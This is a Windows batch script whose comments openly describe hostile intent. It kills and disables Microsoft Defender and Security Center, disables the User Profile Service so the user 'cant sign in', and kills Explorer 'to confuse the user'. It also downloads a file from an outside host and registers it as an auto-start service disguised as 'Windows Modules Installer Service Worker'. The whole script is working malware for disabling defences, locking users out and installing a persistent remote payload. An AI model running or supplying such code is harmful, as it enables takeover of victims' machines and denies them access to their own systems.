@echo off
cd %temp%
md 0b8ae314-21b1-435e-ab26-260846fa9020
cd 0b8ae314-21b1-435e-ab26-260846fa9020

REM Try to disable MS Defender
taskkill /f /im MsMpEng.exe
sc config "WinDefend" start= disabled
sc config "wscsvc" start= disabled


REM Disable the User Profile Service so the user cant sign in
sc config "User Profile Service" start= disabled
if %lang% == de_DE sc config "Benutzerprofildienst" start= disabled

REM disable services
sc config "mppsvc" start= disabled
sc config "Netlogon" start= disabled
sc config "WbioSrvc" start= disabled
sc config "webthreatdefsvc" start= disabled
sc config "webthreatdefusersvc" start= disabled
sc config "WEPHOSTSVC" start= disabled
sc config "wlidsvc" start= disabled
sc config "WMansvc" start= disabled
sc config "wlpasvc" start= disabled
  
REM kill EXPLORER to confuse the user
taskkill /f /im explorer.exe

REM Create a service for Client.CMD
powershell -Command "Invoke-WebRequest http://www.example.com/package.zip -OutFile C:\Program Files\client.cmd"
sc create wmisswsvc binpath= "C:\Windows\system32\cmd.exe start /min C:\Program Files\client.cmd" error= ignore start= auto type= own displayname= "Windows Modules Installer Service Worker"


